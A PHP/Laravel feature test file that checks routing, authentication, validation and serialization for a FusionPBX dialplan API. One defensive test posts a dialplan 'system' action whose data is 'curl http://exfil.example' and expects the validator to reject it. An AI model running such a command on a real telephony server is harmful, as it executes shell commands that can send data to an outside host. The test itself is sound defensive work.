<?php

namespace Tests\Feature\Api\V1;

use App\Data\Api\V1\DialplanData;
use App\Models\DialplanDetails;
use App\Models\Dialplans;
use App\Models\User;
use App\Services\Auth\PermissionService;
use App\Services\FreeswitchEslService;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;
use Laravel\Sanctum\Sanctum;
use Mockery;
use Tests\TestCase;

/**
 * Coverage for the Api\V1\DialplanController endpoints (NOV-1009).
 *
 * WHAT ACTUALLY RUNS HERE, and why the rest does not:
 *
 * This repository ships no test database. `phpunit.xml` leaves DB_CONNECTION
 * commented out, the 90 migrations target the FusionPBX PostgreSQL schema, there
 * is no Domain / Dialplans factory, and the only other Api/V1 test
 * (CdrRecordingUrlTest) skips its own DB-backed cases for the same reason.
 *
 * So this file splits in two:
 *
 *  - Tests that prove something WITHOUT a database, and really run:
 *      * the six routes are mounted with their permission middleware, and
 *        /dialplans/reload really resolves to reload() and not to show();
 *      * 401 without a token, 403 without the permission, 403 outside the domain
 *        scope, 400 on a malformed UUID, 400 on a body the FormRequest refuses;
 *      * the serialization: the XML never leaves the API, the lines come back in
 *        the very shape a PATCH sends them.
 *
 *  - Tests that need the schema. They are written in full and call
 *    markTestSkipped() with an explicit reason. They are NOT proof of anything
 *    until they are run on an environment that has the database.
 *
 * The write rules themselves live in Tests\Unit\Api\V1\StoreDialplanRequestTest,
 * which runs in full.
 */
class DialplanApiTest extends TestCase
{
    private const DOMAIN_UUID = '4018f7a3-8e0a-47bb-9f4f-04b1313e0e1b';
    private const DIALPLAN_UUID = '8c0f2b1d-1f2e-4a3b-9c4d-5e6f7a8b9c0d';

    protected function tearDown(): void
    {
        Mockery::close();
        parent::tearDown();
    }

    // -----------------------------------------------------------------------
    // Routing — guards the "route declared but never mounted" defect
    // -----------------------------------------------------------------------

    /**
     * @dataProvider dialplanRoutes
     */
    public function test_route_is_mounted_with_its_permission_middleware(
        string $method,
        string $uri,
        string $action,
        string $permission
    ): void {
        $route = collect(Route::getRoutes()->getRoutes())
            ->first(fn ($route) => $route->uri() === $uri && in_array($method, $route->methods(), true));

        $this->assertNotNull($route, "Route {$method} {$uri} is not registered.");
        $this->assertSame('App\Http\Controllers\Api\V1\DialplanController@' . $action, $route->getActionName());

        $middleware = $route->gatherMiddleware();
        $this->assertContains('auth:sanctum', $middleware);
        $this->assertContains('api.token.auth', $middleware);
        $this->assertContains('throttle:api', $middleware);
        $this->assertContains('user.authorize:' . $permission, $middleware);
    }

    public static function dialplanRoutes(): array
    {
        return [
            'list' => ['GET', 'api/v1/domains/{domain_uuid}/dialplans', 'index', 'dialplan_view'],
            'create' => ['POST', 'api/v1/domains/{domain_uuid}/dialplans', 'store', 'dialplan_add'],
            'reload' => ['POST', 'api/v1/domains/{domain_uuid}/dialplans/reload', 'reload', 'dialplan_view'],
            'read' => ['GET', 'api/v1/domains/{domain_uuid}/dialplans/{dialplan_uuid}', 'show', 'dialplan_view'],
            'update' => ['PATCH', 'api/v1/domains/{domain_uuid}/dialplans/{dialplan_uuid}', 'update', 'dialplan_edit'],
            'delete' => ['DELETE', 'api/v1/domains/{domain_uuid}/dialplans/{dialplan_uuid}', 'destroy', 'dialplan_delete'],
        ];
    }

    /**
     * `reload` is a literal segment sitting where a UUID is expected. Declared
     * after the parameterised route it would be swallowed by it, and a reload
     * would read as "show the plan whose UUID is reload".
     */
    public function test_the_reload_segment_is_not_read_as_a_dialplan_uuid(): void
    {
        $route = Route::getRoutes()->match(
            Request::create($this->collectionEndpoint() . '/reload', 'POST')
        );

        $this->assertSame('App\Http\Controllers\Api\V1\DialplanController@reload', $route->getActionName());
    }

    public function test_put_is_not_mounted_on_a_dialplan(): void
    {
        $route = collect(Route::getRoutes()->getRoutes())
            ->first(fn ($route) => $route->uri() === 'api/v1/domains/{domain_uuid}/dialplans/{dialplan_uuid}'
                && in_array('PUT', $route->methods(), true));

        $this->assertNull($route, 'The contract says the update verb is PATCH; PUT must answer 405.');
    }

    // -----------------------------------------------------------------------
    // Authentication and authorization — no database needed
    // -----------------------------------------------------------------------

    public function test_unauthenticated_returns_401(): void
    {
        $this->postJson($this->collectionEndpoint(), [])
            ->assertStatus(401)
            ->assertJsonPath('error.type', 'authentication_error')
            ->assertJsonPath('error.code', 'unauthenticated');
    }

    public function test_bearer_without_the_permission_is_forbidden(): void
    {
        $this->actingAsApiUser(canAccessDomain: true, hasPermission: false);

        $this->postJson($this->collectionEndpoint(), [])
            ->assertStatus(403)
            ->assertJsonPath('error.code', 'forbidden_permission')
            ->assertJsonPath('error.permission', 'dialplan_add');
    }

    public function test_domain_outside_the_caller_scope_is_forbidden(): void
    {
        $this->actingAsApiUser(canAccessDomain: false, hasPermission: true);

        $this->getJson($this->itemEndpoint())
            ->assertStatus(403)
            ->assertJsonPath('error.code', 'forbidden_domain')
            ->assertJsonPath('error.param', 'domain_uuid');
    }

    public function test_malformed_domain_uuid_returns_400(): void
    {
        $this->actingAsApiUser();

        $this->getJson('/api/v1/domains/not-a-uuid/dialplans/' . self::DIALPLAN_UUID)
            ->assertStatus(400)
            ->assertJsonPath('error.code', 'invalid_request')
            ->assertJsonPath('error.param', 'domain_uuid');
    }

    /**
     * The format is checked before any query, so a malformed UUID answers 400 and
     * not the 500 a query against an absent schema would produce.
     */
    public function test_malformed_dialplan_uuid_returns_400(): void
    {
        $this->actingAsApiUser();

        $this->getJson($this->itemEndpoint(self::DOMAIN_UUID, 'not-a-uuid'))
            ->assertStatus(400)
            ->assertJsonPath('error.code', 'invalid_request')
            ->assertJsonPath('error.param', 'dialplan_uuid');
    }

    /**
     * Proves the FormRequest is really wired to the route: the body is refused
     * before the controller, hence before any query.
     */
    public function test_a_creation_without_lines_is_refused_before_it_reaches_the_service(): void
    {
        $this->actingAsApiUser();

        $this->postJson($this->collectionEndpoint(), [
            'dialplan_name' => 'callpulse_ai_9001',
            'dialplan_context' => 'client.exemple.fr',
            'dialplan_continue' => false,
            'dialplan_order' => 100,
            'dialplan_enabled' => true,
        ])
            ->assertStatus(400)
            ->assertJsonPath('error.type', 'invalid_request_error')
            ->assertJsonPath('error.code', 'invalid_parameter')
            ->assertJsonPath('error.param', 'details');
    }

    public function test_a_dangerous_application_is_refused_before_it_reaches_the_service(): void
    {
        $this->actingAsApiUser();

        $this->postJson($this->collectionEndpoint(), [
            'dialplan_name' => 'callpulse_ai_9001',
            'dialplan_context' => 'client.exemple.fr',
            'dialplan_continue' => false,
            'dialplan_order' => 100,
            'dialplan_enabled' => true,
            'details' => [[
                'dialplan_detail_tag' => 'action',
                'dialplan_detail_type' => 'system',
                'dialplan_detail_data' => 'curl http://exfil.example',
                'dialplan_detail_order' => 10,
            ]],
        ])
            ->assertStatus(400)
            ->assertJsonPath('error.code', 'invalid_parameter')
            ->assertJsonPath('error.param', 'details.0.dialplan_detail_type');
    }

    // -----------------------------------------------------------------------
    // Serialization — the XML never leaves, the lines come back re-sendable
    // -----------------------------------------------------------------------

    public function test_the_api_representation_exposes_exactly_the_documented_fields(): void
    {
        $payload = DialplanData::fromModel($this->inMemoryDialplan())->toArray();

        $this->assertEqualsCanonicalizing([
            'dialplan_uuid', 'object', 'domain_uuid', 'dialplan_name', 'dialplan_number',
            'dialplan_context', 'dialplan_order', 'dialplan_enabled', 'dialplan_continue',
            'dialplan_destination', 'dialplan_description', 'details', 'switch_response',
        ], array_keys($payload));
    }

    /**
     * In builder mode the XML is rebuilt from the lines on every write: returning
     * it would publish a derived truth a client could be tempted to send back.
     */
    public function test_the_stored_xml_never_leaves_the_api(): void
    {
        $dialplan = $this->inMemoryDialplan();
        $dialplan->forceFill([
            'dialplan_xml' => '<extension name="callpulse_ai_9001"><condition field="destination_number"/></extension>',
            'insert_user' => 'b2c5a9de-0f47-4a1e-9b64-1f5a9f0c7a11',
        ]);

        $json = json_encode(DialplanData::fromModel($dialplan, [$this->inMemoryDetail()])->toArray());

        $this->assertStringNotContainsString('<extension', $json);
        $this->assertStringNotContainsString('dialplan_xml', $json);
        $this->assertStringNotContainsString('insert_user', $json);
    }

    /**
     * What a GET shows must be sendable back as `details` without translation:
     * a PATCH replaces the whole set of lines, so the read is the starting point
     * of every write.
     */
    public function test_a_line_comes_back_in_the_shape_a_patch_sends_it(): void
    {
        $payload = DialplanData::fromModel($this->inMemoryDialplan(), [$this->inMemoryDetail()])->toArray();

        $this->assertCount(1, $payload['details']);
        $this->assertEqualsCanonicalizing([
            'dialplan_detail_uuid', 'dialplan_detail_tag', 'dialplan_detail_type',
            'dialplan_detail_data', 'dialplan_detail_break', 'dialplan_detail_inline',
            'dialplan_detail_group', 'dialplan_detail_order', 'dialplan_detail_enabled',
        ], array_keys($payload['details'][0]));

        $this->assertSame('action', $payload['details'][0]['dialplan_detail_tag']);
        $this->assertSame('bridge', $payload['details'][0]['dialplan_detail_type']);
        $this->assertSame(60, $payload['details'][0]['dialplan_detail_order']);
        $this->assertTrue($payload['details'][0]['dialplan_detail_enabled']);
        $this->assertNull($payload['details'][0]['dialplan_detail_inline']);
    }

    /**
     * v_dialplans stores booleans as TEXT: what the API answers is a real JSON
     * boolean, and the string 'false' is false — not a non-empty string.
     */
    public function test_the_text_booleans_are_answered_as_json_booleans(): void
    {
        $payload = DialplanData::fromModel($this->inMemoryDialplan())->toArray();

        $this->assertTrue($payload['dialplan_enabled']);
        $this->assertFalse($payload['dialplan_continue']);
        $this->assertFalse($payload['dialplan_destination']);
        $this->assertSame(100, $payload['dialplan_order']);
    }

    /**
     * A column that was never set stays unknown instead of being reported as
     * "false", which would read as an explicit choice.
     */
    public function test_an_unset_destination_stays_null(): void
    {
        $dialplan = $this->inMemoryDialplan();
        $dialplan->forceFill(['dialplan_destination' => null]);

        $this->assertNull(DialplanData::fromModel($dialplan)->toArray()['dialplan_destination']);
    }

    /**
     * A list entry omits the lines entirely rather than claiming a plan has none.
     */
    public function test_a_list_entry_carries_no_line(): void
    {
        $payload = DialplanData::summary($this->inMemoryDialplan())->toArray();

        $this->assertArrayNotHasKey('details', $payload);
        $this->assertArrayNotHasKey('switch_response', $payload);
        $this->assertSame('dialplan', $payload['object']);
    }

    public function test_the_switch_response_is_reported_after_a_write(): void
    {
        $payload = DialplanData::fromModel($this->inMemoryDialplan(), [], '+OK Job-UUID: 4f2c')->toArray();

        $this->assertSame('+OK Job-UUID: 4f2c', $payload['switch_response']);
    }

    // -----------------------------------------------------------------------
    // Cases that need the FusionPBX schema — written, not proven
    // -----------------------------------------------------------------------

    public function test_create_writes_the_plan_and_its_lines(): void
    {
        $this->skipWithoutDatabase();

        $this->actingAsApiUser();

        $response = $this->postJson($this->collectionEndpoint(), $this->validCreatePayload());

        $response->assertStatus(201)
            ->assertJsonPath('object', 'dialplan')
            ->assertJsonPath('domain_uuid', self::DOMAIN_UUID)
            ->assertJsonStructure(['dialplan_uuid', 'dialplan_name', 'details', 'switch_response'])
            ->assertHeader('Location');

        $uuid = $response->json('dialplan_uuid');

        // The point of the endpoint: a plan without lines routes nothing.
        $this->assertCount(8, $response->json('details'));
        $this->assertSame(8, DialplanDetails::query()->where('dialplan_uuid', $uuid)->count());

        // Written in the engine's order, not in the order of the array.
        $this->assertSame(
            [10, 20, 30, 40, 50, 55, 56, 60],
            DialplanDetails::query()->where('dialplan_uuid', $uuid)
                ->orderBy('dialplan_detail_group')->orderBy('dialplan_detail_order')
                ->pluck('dialplan_detail_order')->map(fn ($o) => (int) $o)->all()
        );

        $stored = Dialplans::query()->find($uuid);

        // The route domain wins over the session-derived one the model constructor reads.
        $this->assertSame(self::DOMAIN_UUID, $stored->domain_uuid);
        // The XML is rebuilt from the lines and carries the bridge.
        $this->assertStringContainsString('sofia/gateway/', $stored->dialplan_xml);
        // session('user_uuid') is null under Sanctum: the author is stamped by the controller.
        $this->assertNotNull($stored->insert_user);
    }

    public function test_read_returns_the_plan_with_its_lines(): void
    {
        $this->skipWithoutDatabase();

        $this->actingAsApiUser();

        $this->getJson($this->itemEndpoint())
            ->assertStatus(200)
            ->assertJsonPath('dialplan_uuid', self::DIALPLAN_UUID)
            ->assertJsonPath('object', 'dialplan')
            ->assertJsonStructure(['details' => [['dialplan_detail_tag', 'dialplan_detail_order']]]);
    }

    public function test_read_refuses_a_plan_of_another_domain_with_404(): void
    {
        $this->skipWithoutDatabase();

        $this->actingAsApiUser();

        // A valid UUID attached to another domain is a 404, not a 403: the API
        // never confirms the existence of a resource outside the scope.
        $this->getJson($this->itemEndpoint(self::DOMAIN_UUID, 'ffffffff-ffff-ffff-ffff-ffffffffffff'))
            ->assertStatus(404)
            ->assertJsonPath('error.code', 'resource_missing')
            ->assertJsonPath('error.param', 'dialplan_uuid');
    }

    public function test_list_is_paginated_by_cursor(): void
    {
        $this->skipWithoutDatabase();

        $this->actingAsApiUser();

        $this->getJson($this->collectionEndpoint() . '?limit=1')
            ->assertStatus(200)
            ->assertJsonPath('object', 'list')
            ->assertJsonPath('url', $this->collectionEndpoint())
            ->assertJsonStructure(['has_more', 'data' => [['dialplan_uuid', 'dialplan_name']]]);

        // A list entry never carries the lines.
        $this->assertArrayNotHasKey('details', $this->getJson($this->collectionEndpoint())->json('data.0'));
    }

    public function test_list_refuses_a_malformed_cursor(): void
    {
        $this->skipWithoutDatabase();

        $this->actingAsApiUser();

        $this->getJson($this->collectionEndpoint() . '?starting_after=not-a-uuid')
            ->assertStatus(400)
            ->assertJsonPath('error.param', 'starting_after');
    }

    /**
     * Writing into public or another tenant's context is call interception:
     * the context must be the domain name of the route tenant.
     */
    public function test_create_refuses_a_context_that_is_not_the_tenant_domain(): void
    {
        $this->skipWithoutDatabase();

        $this->actingAsApiUser();

        $payload = $this->validCreatePayload();
        $payload['dialplan_context'] = 'public';

        $this->postJson($this->collectionEndpoint(), $payload)
            ->assertStatus(400)
            ->assertJsonPath('error.code', 'invalid_parameter')
            ->assertJsonPath('error.param', 'dialplan_context');
    }

    public function test_update_refuses_a_context_that_is_not_the_tenant_domain(): void
    {
        $this->skipWithoutDatabase();

        $this->actingAsApiUser();

        $this->patchJson($this->itemEndpoint(), ['dialplan_context' => 'autre-client.fr'])
            ->assertStatus(400)
            ->assertJsonPath('error.code', 'invalid_parameter')
            ->assertJsonPath('error.param', 'dialplan_context');
    }

    /**
     * The trap of this endpoint: DialplanService::save() reads
     * `$validated['dialplan_details'] ?? []`, so a PATCH that does not mention
     * the lines would rebuild the plan with NONE. The controller resends the
     * stored ones.
     */
    public function test_update_keeps_the_lines_the_patch_does_not_mention(): void
    {
        $this->skipWithoutDatabase();

        $this->actingAsApiUser();

        $before = DialplanDetails::query()->where('dialplan_uuid', self::DIALPLAN_UUID)->count();
        $this->assertGreaterThan(0, $before);

        $this->patchJson($this->itemEndpoint(), ['dialplan_enabled' => false])
            ->assertStatus(200)
            ->assertJsonPath('dialplan_enabled', false)
            ->assertJsonCount($before, 'details');

        $after = Dialplans::query()->find(self::DIALPLAN_UUID);

        $this->assertSame($before, DialplanDetails::query()->where('dialplan_uuid', self::DIALPLAN_UUID)->count());
        $this->assertSame('false', $after->getRawOriginal('dialplan_enabled'));
        // A partial PATCH must not empty what it did not mention.
        $this->assertNotNull($after->dialplan_context);
        $this->assertStringContainsString('<extension', $after->dialplan_xml);
    }

    public function test_update_replaces_the_whole_set_of_lines_when_it_sends_them(): void
    {
        $this->skipWithoutDatabase();

        $this->actingAsApiUser();

        $this->patchJson($this->itemEndpoint(), [
            'details' => [
                [
                    'dialplan_detail_tag' => 'condition',
                    'dialplan_detail_type' => 'destination_number',
                    'dialplan_detail_data' => '^9002$',
                    'dialplan_detail_group' => 0,
                    'dialplan_detail_order' => 10,
                ],
                [
                    'dialplan_detail_tag' => 'action',
                    'dialplan_detail_type' => 'bridge',
                    'dialplan_detail_data' => 'sofia/gateway/47aa96db-3f70-46ce-bb9a-79ccef396f2b/cp90029ad0b3ae08',
                    'dialplan_detail_group' => 0,
                    'dialplan_detail_order' => 20,
                ],
            ],
        ])
            ->assertStatus(200)
            ->assertJsonCount(2, 'details');

        $this->assertSame(2, DialplanDetails::query()->where('dialplan_uuid', self::DIALPLAN_UUID)->count());
    }

    public function test_delete_removes_the_plan_and_its_lines(): void
    {
        $this->skipWithoutDatabase();

        $this->actingAsApiUser();

        $this->deleteJson($this->itemEndpoint())
            ->assertStatus(204)
            ->assertNoContent();

        $this->assertNull(Dialplans::query()->find(self::DIALPLAN_UUID));
        $this->assertSame(0, DialplanDetails::query()->where('dialplan_uuid', self::DIALPLAN_UUID)->count());
    }

    public function test_reload_delivers_the_command_with_200(): void
    {
        $this->skipWithoutDatabase();

        $this->actingAsApiUser();
        $this->mockEventSocket('+OK Job-UUID: 4f2c8f1e-0000-4000-8000-000000000000');

        $this->postJson($this->collectionEndpoint() . '/reload')
            ->assertStatus(200)
            ->assertJsonPath('object', 'dialplan_reload')
            ->assertJsonStructure(['switch_response']);
    }

    /**
     * A reload that did not happen must never read as a success: the database is
     * up to date but the engine still serves the previous plan, so the new
     * extension is not reachable.
     */
    public function test_reload_surfaces_an_engine_error_as_422(): void
    {
        $this->skipWithoutDatabase();

        $this->actingAsApiUser();

        $esl = Mockery::mock(FreeswitchEslService::class);
        $esl->shouldReceive('isConnected')->andReturn(false);
        $esl->shouldNotReceive('executeCommand');
        $this->app->instance(FreeswitchEslService::class, $esl);

        $this->postJson($this->collectionEndpoint() . '/reload')
            ->assertStatus(422)
            ->assertJsonPath('error.code', 'switch_error');
    }

    /**
     * A write whose reload failed still answers 201: the plan IS written. The
     * failure is reported in switch_response, and POST /dialplans/reload is the
     * way to retry it.
     */
    public function test_a_creation_reports_a_failed_reload_without_failing(): void
    {
        $this->skipWithoutDatabase();

        $this->actingAsApiUser();

        $esl = Mockery::mock(FreeswitchEslService::class);
        $esl->shouldReceive('isConnected')->andReturn(false);
        $this->app->instance(FreeswitchEslService::class, $esl);

        $this->postJson($this->collectionEndpoint(), $this->validCreatePayload())
            ->assertStatus(201)
            ->assertJsonPath('switch_response', '-ERR Could not connect to FreeSWITCH event socket.');
    }

    // -----------------------------------------------------------------------
    // Helpers
    // -----------------------------------------------------------------------

    private function skipWithoutDatabase(): void
    {
        $this->markTestSkipped(
            'Requires the FusionPBX schema and Domain / Dialplans factories, which this '
            . 'repository does not ship: phpunit.xml leaves DB_CONNECTION commented out, '
            . 'the 90 migrations target PostgreSQL/FusionPBX and database/factories/ only '
            . 'holds UserFactory. To be run on an environment that has the database.'
        );
    }

    private function collectionEndpoint(string $domain = self::DOMAIN_UUID): string
    {
        return "/api/v1/domains/{$domain}/dialplans";
    }

    private function itemEndpoint(string $domain = self::DOMAIN_UUID, string $dialplan = self::DIALPLAN_UUID): string
    {
        return "/api/v1/domains/{$domain}/dialplans/{$dialplan}";
    }

    /**
     * Sanctum-authenticated caller with PermissionService stubbed out: the
     * permission tables live in the FusionPBX schema, which the test environment
     * does not have. What is exercised here is the middleware wiring of the
     * routes, not PermissionService itself.
     */
    private function actingAsApiUser(bool $canAccessDomain = true, bool $hasPermission = true): User
    {
        $permissions = Mockery::mock(PermissionService::class);
        $permissions->shouldReceive('userCanAccessDomain')->andReturn($canAccessDomain);
        $permissions->shouldReceive('userHasPermission')->andReturn($hasPermission);
        $this->app->instance(PermissionService::class, $permissions);

        $user = new User();
        $user->user_uuid = 'b2c5a9de-0f47-4a1e-9b64-1f5a9f0c7a11';
        $user->domain_uuid = self::DOMAIN_UUID;

        Sanctum::actingAs($user);

        $this->withHeader('Authorization', 'Bearer test-token');

        return $user;
    }

    private function mockEventSocket(string $response): void
    {
        $esl = Mockery::mock(FreeswitchEslService::class);
        $esl->shouldReceive('isConnected')->andReturn(true);
        $esl->shouldReceive('executeCommand')->with('bgapi reloadxml')->andReturn($response);
        $this->app->instance(FreeswitchEslService::class, $esl);
    }

    private function inMemoryDialplan(): Dialplans
    {
        $dialplan = new Dialplans();
        $dialplan->forceFill([
            'dialplan_uuid' => self::DIALPLAN_UUID,
            'domain_uuid' => self::DOMAIN_UUID,
            'dialplan_name' => 'callpulse_ai_9001',
            'dialplan_number' => '9001',
            'dialplan_context' => 'client.exemple.fr',
            'dialplan_order' => '100',
            'dialplan_enabled' => 'true',
            'dialplan_continue' => 'false',
            'dialplan_destination' => 'false',
            'dialplan_description' => 'Extension IA CallPulse — poste 9001',
        ]);

        return $dialplan;
    }

    private function inMemoryDetail(): DialplanDetails
    {
        $detail = new DialplanDetails();
        $detail->forceFill([
            'dialplan_detail_uuid' => 'd1f0c9a2-3b4c-4d5e-8f60-112233445566',
            'dialplan_uuid' => self::DIALPLAN_UUID,
            'domain_uuid' => self::DOMAIN_UUID,
            'dialplan_detail_tag' => 'action',
            'dialplan_detail_type' => 'bridge',
            'dialplan_detail_data' => 'sofia/gateway/47aa96db-3f70-46ce-bb9a-79ccef396f2b/cp90029ad0b3ae08',
            'dialplan_detail_break' => null,
            'dialplan_detail_inline' => null,
            'dialplan_detail_group' => '0',
            'dialplan_detail_order' => '60',
            'dialplan_detail_enabled' => 'true',
        ]);

        return $detail;
    }

    private function validCreatePayload(): array
    {
        $line = fn (string $tag, string $type, string $data, int $order): array => [
            'dialplan_detail_tag' => $tag,
            'dialplan_detail_type' => $type,
            'dialplan_detail_data' => $data,
            'dialplan_detail_group' => 0,
            'dialplan_detail_order' => $order,
            'dialplan_detail_enabled' => true,
        ];

        return [
            'dialplan_name' => 'callpulse_ai_9001',
            'dialplan_number' => '9001',
            'dialplan_context' => 'client.exemple.fr',
            'dialplan_continue' => false,
            'dialplan_order' => 100,
            'dialplan_enabled' => true,
            'dialplan_description' => 'Extension IA CallPulse — poste 9001',
            'details' => [
                $line('condition', 'destination_number', '^9001$', 10),
                $line('action', 'set', 'hangup_after_bridge=true', 20),
                $line('action', 'set', 'continue_on_fail=false', 30),
                $line('action', 'export', 'sip_h_X-Callpulse-Binding-Id=b-1', 40),
                $line('action', 'export', 'sip_h_X-Callpulse-Org-Id=org-1', 50),
                $line('action', 'export', 'sip_h_X-Callpulse-DID=9001', 55),
                $line('action', 'export', 'sip_h_X-Callpulse-Caller=${caller_id_number}', 56),
                $line('action', 'bridge', 'sofia/gateway/47aa96db-3f70-46ce-bb9a-79ccef396f2b/cp90029ad0b3ae08', 60),
            ],
        ];
    }
}
